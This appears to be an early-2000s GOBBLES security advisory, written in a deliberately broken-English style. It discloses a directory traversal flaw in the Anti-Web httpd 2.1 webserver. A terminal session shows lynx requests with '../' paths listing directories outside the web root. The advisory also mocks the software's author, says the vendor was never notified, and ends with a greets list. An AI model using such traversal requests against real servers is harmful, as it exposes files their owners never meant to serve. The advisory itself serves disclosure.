@@ -1,0 +1,322 @@
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++GOBBLES+SECURITY+RESEARCH+TEAM+INCORPORATED+++++++++++++++++
+ALERT! ALERT! -DGAPING_SECURITY_HOLE IN ANTI-WEB WEBSERVERS! ALERT! ALERT!
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+GOBBLES thanks many to dugsong for his kind words to GOBBLES and the
+researchers at GOBBLES Labs concerning the death of our beloved mascot
+Mr. Goldilocks the Goldfish.  Thanks dugsong from GOBBLES for your support
+of us in our time of crisis!  This guy write great sniffer you can
+download from http://www.monkey.org/~dugsong/dsniff/ which is DMCA
+censored but still for download anyways which GOBBLES use sometimes to spy
+on researchers at GOBBLES Labs cybersex conversations (j/k guys and
+girl you all know that GOBBLES respect you privacy it just a joke hehehe).  
+Check out dsniff though sometimes because GOBBLES think you will like it
+on your penetration testing.  Good work on it dugsong from GOBBLES!
+
+Product
+*******
+
+Anti-Web Webserver
+HardCore Software Inc.
+http://bearcountry.cjb.net
+
+BACKGROUD
+*********
+
+OK here is what GOBBLES did.  Since GOBBLES researchers have already found
+big security problems in two hyper text transfer protocol daemons GOBBLES
+did decide "hey what the hell GOBBLES team go research all secure hyper
+text transfer protocol daemons".  The first thing that a GOBBLES
+researcher did do was go to freshmeat.net and search all projects for the
+words 'secure httpd' and this is the first hit that they did receive:
+
+   Sort order: [Exact matches (default)]
+
+   sort
+   No screenshot 1. Anti-Web httpd
+   A small, robust, and secure Web server.
+   Homepage Download Subscribe Ignore Rate
+   No categories filed.
+   Added:      28-Jul-2001
+   Updated:    28-Jul-2001
+   Rating:     0.00/10.00
+   Vitality:   0.00%
+   Popularity: 0.00%
+   License:    GNU General Public License (GPL)
+   Version:
+
+So GOBBLES did go and have it downloaded.  Here are some things said in
+the README file from the tarball that GOBBLES did read concerning this
+program:
+
+...
+This is the 2.1 updated version of Anti-Web. It has now been even more
+hardened against buffer overflows and DoS attacks. (DoS attacks in
+particular). It's simple design has been a boon towards it's security. See
+the CHANGES file to see what exactly has changed.
+...
+After getting fed up with the bloated, complex nature of most of the
+web servers out there (Apache, IIS, most everything), I decided, hell,
+the HyperText Transfer Protocol isn't very complex at all! Why don't I
+write a simple server that can be launched from the command line; no
+configuration files required!
+
+This is the result. A small, robust, secure, drool-proof, but still
+quite flexible, web server.
+...
+
+Also tarball was only 37287 bytes so GOBBLES think that maybe the
+programmer lived up to he word and that he make the server smart, small,
+and secure like he like to say the server is.  Well, GOBBLES find out
+things were different very soon, hehehehe. 
+
+SECURITY HISTORY
+****************
+
+Well GOBBLES could not find any writeups of security problems on Anti-Web
+Webserver on the online but in the tarball and its CHANGELOG there were
+some points of concern from the history one of which is:
+
+	0.9 -> 1.0
+	~~~~~~~~~~
+	-Stability patches galore.
+	-Responds the HEAD requests.
+	-Fixed a buffer overflow that cause a coredump.
+
+But GOBBLES know this is version 2.1 that he is testing and not .9 so he
+hope that programmer learn by now about silly programming errors.  GOBBLES
+once again judged too quickly because GOBBLES did find things wrong with
+this server.
+
+VERSIONS AFFECTED
+*****************
+
+Well GOBBLES did only test 2.1 version of the server since it all that
+were available for download on the website distribution page.  It is
+assumed by GOBBLES that this bug is likely in earlier versions of the
+server but this cannot be confirmed perhaps if you are interested in
+finding out for sure you can email the author of Anti-Web Webserver at
+doug@bearcountry.cjb.net and ask about if the bug GOBBLES did find is in
+older versions too.  GOBBLES was also interested to find that the author
+own webserver is not running this critically acclaimed secure webserver
+that he right, does he no have faith in the bragged security of his
+program or does he know something about its security that the public
+should know?  GOBBLES is suspicious here about this. . .
+
+THE PROBLEM
+***********
+
+Well here is what GOBBLES did do.
+
+GOBBLES@localhost:/tmp$ tar zxf awhttpd-2.1.tgz
+GOBBLES@localhost:/tmp$ cd awhttpd
+GOBBLES@localhost:/tmp/awhttpd$ make
+rm -f awhttpd *.exe
+gcc -Wall -I/usr/local/include -s -o awhttpd awhttpd.c -L/usr/local/lib
+misc.c: In function `discon':
+In file included from awhttpd.c:30:
+misc.c:29: warning: comparison between pointer and integer
+misc.c:37: warning: assignment makes pointer from integer without a cast
+misc.c: In function `die':
+misc.c:45: warning: comparison between pointer and integer
+misc.c: In function `isadir':
+misc.c:123: warning: implicit declaration of function `opendir'
+misc.c:124: warning: implicit declaration of function `closedir'
+awhttpd.c: In function `main':
+awhttpd.c:61: warning: assignment makes pointer from integer without a
+cast
+awhttpd.c:124: warning: implicit declaration of function `inet_ntoa'
+awhttpd.c:124: warning: format argument is not a pointer (arg 3)
+
+
+
+
+@@~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~@@
+@@   Anti-Web HTTPD compilation was a success!        @@
+@@                                                    @@
+@@   This program is Copyright (C) 2001 by            @@
+@@   HardCore Software. This software is distributed  @@
+@@   under the terms of the GNU GPL. Please see the   @@
+@@   file "LICENSE" for details.                      @@
+@@                                                    @@
+@@   Please read the README before using antiweb.     @@
+@@   Your binary is called "awhttpd".                 @@
+@@                                                    @@
+@@   E-Mail me at doug@bearcountry.cjb.net            @@
+@@                  and                               @@
+@@   Visit us at http://hardcoresoftware.cjb.net      @@
+@@                                                    @@
+@@      ANTI-WEB: Take back some simplicity...        @@
+@@                                                    @@
+@@~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~@@
+
+
+GOBBLES@localhost:/tmp/awhttpd$ ./awhttpd
+Anti Web HTTPD By HardCore Software: V2.1
+usage: awhttpd <directory> [port]
+GOBBLES@localhost:/tmp/awhttpd$
+GOBBLES@localhost:/tmp/awhttpd$ ./awhttpd . 8000
+Unable to find ./index.html
+GOBBLES@localhost:/tmp/awhttpd$ touch index.html
+GOBBLES@localhost:/tmp/awhttpd$ ./awhttpd . 8000
+ [*************************************************]
+ [       Anti-Web V2.1 by HardCore Software        ]
+ [         **TAKE BACK SOME SIMPLICITY**           ]
+ [*************************************************]
+ [  DIRECTORY {.}                                  ]
+ [  -=PID {10308}=-=PORT {8000}=-=UID {1332}=-     ]
+ [*************************************************]
+GOBBLES@localhost:/tmp/awhttpd$ lynx -dump localhost:8000/../ >GOBBLES
+GOBBLES@localhost:/tmp/awhttpd$ cat GOBBLES
+
+Current directory is /tmp/awhttpd/
+
+    -rw-------    1 GOBBLES  hackers       1786 Jul 21 14:34 [1]CHANGES
+    -rw-------    1 GOBBLES  hackers          0 Nov 26 09:10 [2]GOBBLES
+    -rw-------    1 GOBBLES  hackers      17992 Jul 21 14:34 [3]LICENSE
+    -rw-------    1 GOBBLES  hackers       1451 Jul 21 14:34 [4]Makefile
+    -rw-------    1 GOBBLES  hackers      10658 Jul 21 14:34 [5]README
+    -rwx------    1 GOBBLES  hackers      16628 Nov 26 09:03 [6]awhttpd
+    -rw-------    1 GOBBLES  hackers       3705 Jul 21 14:34 [7]awhttpd.c
+    -rw-------    1 GOBBLES  hackers        762 Jul 21 14:34 [8]awhttpd.h
+    drwx------    2 GOBBLES  hackers       4096 Jul 21 14:34 [9]bin/
+    -rw-------    1 GOBBLES  hackers        845 Jul 21 14:34 [10]config.h
+    -rw-------    1 GOBBLES  hackers          0 Nov 26 09:05 [11]index.html
+    -rw-------    1 GOBBLES  hackers       5904 Jul 21 14:34 [12]misc.c
+    -rw-------    1 GOBBLES  hackers       2850 Jul 21 14:34 [13]procin.c
+    -rw-------    1 GOBBLES  hackers       2726 Jul 21 14:34 [14]procout.c
+    -rw-------    1 GOBBLES  hackers       1161 Jul 21 14:34 [15]procscrpt.c
+
+References
+
+   1. file://localhost/tmp/awhttpd/CHANGES
+   2. file://localhost/tmp/awhttpd/GOBBLES
+   3. file://localhost/tmp/awhttpd/LICENSE
+   4. file://localhost/tmp/awhttpd/Makefile
+   5. file://localhost/tmp/awhttpd/README
+   6. file://localhost/tmp/awhttpd/awhttpd
+   7. file://localhost/tmp/awhttpd/awhttpd.c
+   8. file://localhost/tmp/awhttpd/awhttpd.h
+   9. file://localhost/tmp/awhttpd/bin
+  10. file://localhost/tmp/awhttpd/config.h
+  11. file://localhost/tmp/awhttpd/index.html
+  12. file://localhost/tmp/awhttpd/misc.c
+  13. file://localhost/tmp/awhttpd/procin.c
+  14. file://localhost/tmp/awhttpd/procout.c
+  15. file://localhost/tmp/awhttpd/procscrpt.c
+GOBBLES@localhost:/tmp/awhttpd$ lynx -dump localhost:8000/../../ >GOBBLES2
+GOBBLES@localhost:/tmp/awhttpd$ cat GOBBLES2
+
+Current directory is /tmp/
+
+    -rw-------    1 GOBBLES  hackers      37287 Nov 26 09:03 [1]awhttpd-2.1.tgz
+    drwx------    3 GOBBLES  hackers       4096 Nov 26 09:12 [2]awhttpd/
+    -rwsr-xr-x    1 root     root        295012 Nov 26 09:11 [3]loki
+
+References
+
+   1. file://localhost/tmp/awhttpd-2.1.tgz
+   2. file://localhost/tmp/awhttpd
+   3. file://localhost/tmp/loki
+GOBBLES@localhost:/tmp/awhttpd$
+
+GOBBLES think that by now you get the idea about what crap this secure 
+webserver really are, especially when it own author will not run it on 
+he system!
+
+VENDOR NOTIFICATION STATUS
+**************************
+
+GOBBLES did instruct the team to not contact the programmer of this crap
+webserver that say it secure because of following reasons.  First to show
+a paste from README file included in distribution tarball.
+
+...
+Originally, I opted on the side of slack, and wrote AWHTTPD as a
+forking web server, which turned out to be somewhat of a mistake. I
+felt to constrained with the code of 1.0, that I sat down and did a
+complete rewrite of it. Enter AWHTTPD 2.0: A single process webserver
+that takes care of everything my own personal website needs, plus, I
+can sleep at night knowing that my site won't be vulnerable to the latest
+IIS security bug of the week.
+...
+
+GOBBLES see here this person making a mockery of the security of another
+product and claiming that he product is superior to it but in reality he
+have put an old bug in his own program that is similar to old IIS 3.0 bug.
+At least with new versions of IIS the /../ kinds of directory traversal
+bugs require elite trickery methods like unicode to walk around the 
+filesystem.  GOBBLES does see no reason to take time out of he day to 
+personally notify a vendor of a product that brag security and mock the
+insecurity of other similar type products from other vendors when the old
+type of IIS bug of the week he talk about is still in his own webserver
+which seem a little stupid to GOBBLES.  If you have a problem with GOBBLES
+not wanting to inform idiotic programmer about bug you can probably email
+and yell at us for it but GOBBLES see nothing ethically wrong in this
+instance due to the mocking tones in the README file about other products
+insecurity.  Go get a clue doug.
+
+EXPLOIT
+*******
+
+GOBBLES think no special exploit needed for this bug when Internet Explorer,
+lynx, links, Netscape Navigator, Mozilla, Konquerer, and Opera exist which
+all can easily exploit the bug without any hassle.  
+
+SUGGESTED WORKAROUNDS
+*********************
+
+Well GOBBLES think that this product are complete crap and is the author is
+an evil, evil man for claiming it security in such a fashion so the 
+following recommendations is made about the product to the world.
+
+1] Install a different webserver program probably any ones that the author
+does mock in his README file like IIS and Apache are better choices than
+this program.
+
+2] That is GOBBLES only idea for this.
+
+GREETS
+******
+
+dianora, tsk, snow, carolyn meinel, john vranesevich, steve gibson, kimble,
+knightmare, emmanuel goldstein, box.sk, @stake, securityfocus, sans.org,
+blackhat.com, defcon.org, 2600.com, #phrack@efnet, #hackphreak@undernet,
+bugtraq (thanks aleph1 and david ahmad for devoting your time to a great
+list), ntbugtraq (russel the love muscle ;D), cert.org, paul vixie, vesselin
+bontchev, reese witherspoon, kirsten dunst, katie holmes, aleister crowley,
+manly p hall, franz bardon, dennis ritchie, nietzsche, w. richard stevens,
+radiohead, george michael, larry wall, beethoven, francis bacon, bruce
+willis, bruce schneier, alan turing, john von neumann, donald knuth, michael
+abrash, robert sedgewick, richard simmons, goverment boy, ralph lauren,
+kevin mitnick, david koresh, the violent femmes, legions of doom, quentin
+tarantino, JUPES, security.nnov.ru, dugsong, wayne gretzky,
+hhp-programming.net (hehe thanks for putting x86 Solaris shellcode in
+your Sparc exploits to confuse the scriptkiddies so that the exploits
+are not abused) and all our friends and family.
+
+OH yeah GOBBLES have a beef to chew with members of Legions of the
+Underworld at http://www.legions.org where they say on they webpage the
+following:
+
+    I ask the underground community to please think before you act.
+    We will not condemn nor praise any attempt at cyberwarfare,
+    but please understand, that the people you are trying to mess
+    with are average people, and in America's view of freedom, it's
+    acceptable for them to hate Americans. If you do upset the
+    Taliban, or affiliated parties, remember that you are messing with
+    a terrorist organization. Things could come back on you.  Please,
+    think before you act.
+
+GOBBLES do not specifically and exactly understand the why a group would
+address the entire underground hacker community on a public website that 
+isn't even with SSL support or a password to prevent the public from reading
+it because should not the underground be underground and not on google.com
+advertised webpages where the whole world can read it?  GOBBLES think that
+this sort of thing is more of a press statement to the newspapers of the 
+world (like cnn.com and newsbytes.com) rather than a real plea to we of the
+underground.  GOBBLES seriously question the motives of this "Digital Ebola"
+character and think that he should not be issuing statements publically to
+the underground because then it is not really to the underground but to the
+news media which is awful stupid to us.
